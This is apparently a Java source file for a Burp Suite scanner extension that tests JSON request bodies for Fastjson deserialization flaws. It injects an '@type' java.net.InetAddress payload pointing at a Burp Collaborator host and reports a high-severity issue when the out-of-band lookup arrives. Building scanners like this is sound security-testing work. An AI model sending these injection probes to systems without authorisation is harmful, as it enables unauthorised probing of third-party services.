package BrianW.AKA.BigChan.PowerScanner;

import BrianW.AKA.BigChan.Tools.Global;
import BrianW.AKA.BigChan.Tools.hitRst;
import BrianW.AKA.BigChan.Tools.utils;
import burp.*;

public class ScanFastJson  extends Reporter {
    protected IBurpExtenderCallbacks callbacks;
    protected IExtensionHelpers helpers;

    public ScanFastJson(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) {
        super(callbacks, helpers);
        this.callbacks = callbacks;
        this.helpers = helpers;
    }

    public IScanIssue doScanFastJson(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        byte[] resp = baseRequestResponse.getResponse();
        byte[] req = baseRequestResponse.getRequest();
        String baseName = insertionPoint.getInsertionPointName();
        byte insertionPointType = insertionPoint.getInsertionPointType();
        String baseValue = insertionPoint.getBaseValue();
        //如果参数类型是entire body
        if (insertionPointType == 36) {
//            callbacks.printOutput("param: " + baseName + " ,type: " + insertionPointType + " ,value: " + baseValue);
            if (utils.isJson(baseValue)){
                String collaboratorPayload = Global.interactionServer.getCollaboratorContext().generatePayload(true);
                callbacks.printOutput("generate Fastjson collaboratorPayload: " + collaboratorPayload);
                String payload = "{ \"b\":{\"@type\":\"java.net.InetAddress\",\"val\":\"" + collaboratorPayload + "\"} } ";
                byte[] reqEvil = insertionPoint.buildRequest((payload).getBytes());
                IHttpRequestResponse pairEvil = callbacks.makeHttpRequest(
                        baseRequestResponse.getHttpService(),
                        reqEvil
                );
                pairEvil.setComment(payload);
                Global.interactionServer.addToPairList(collaboratorPayload,
                        reporter(
                                "Fastjson vulnerability found",
                                String.format("param: %s <br>" +
                                                "InsertionPointType: %s <br>" +
                                                "Payload: %s"
                                        ,
                                        baseName,
                                        insertionPointType,
                                        payload
                                ),
                                "High",
                                "Certain",
                                pairEvil
                        )
                );
            }
        }
        return null;
    }
}
